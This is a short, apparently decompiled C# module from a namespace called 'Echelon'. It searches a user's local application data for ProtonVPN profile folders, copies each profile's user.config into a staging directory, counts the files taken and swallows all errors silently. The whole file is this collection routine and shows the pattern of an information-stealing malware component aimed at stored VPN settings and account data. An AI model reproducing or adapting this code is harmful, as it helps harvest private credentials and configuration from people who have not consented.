using Echelon;
using System.IO;

internal class ao
{
	public static int a;

	public static void a(string jj)
	{
		try
		{
			string localData = Global.LocalData;
			if (Directory.Exists(localData + "\\ProtonVPN"))
			{
				string[] directories = Directory.GetDirectories(localData + "\\ProtonVPN");
				Directory.CreateDirectory(jj + "\\Vpn\\ProtonVPN\\");
				string[] array = directories;
				foreach (string text in array)
				{
					if (text.StartsWith(localData + "\\ProtonVPN" + "\\ProtonVPN.exe"))
					{
						string name = new DirectoryInfo(text).Name;
						string[] directories2 = Directory.GetDirectories(text);
						Directory.CreateDirectory(jj + "\\Vpn\\ProtonVPN\\" + name + "\\" + new DirectoryInfo(directories2[0]).Name);
						File.Copy(directories2[0] + "\\user.config", jj + "\\Vpn\\ProtonVPN\\" + name + "\\" + new DirectoryInfo(directories2[0]).Name + "\\user.config");
						ao.a++;
					}
				}
			}
		}
		catch
		{
		}
	}
}
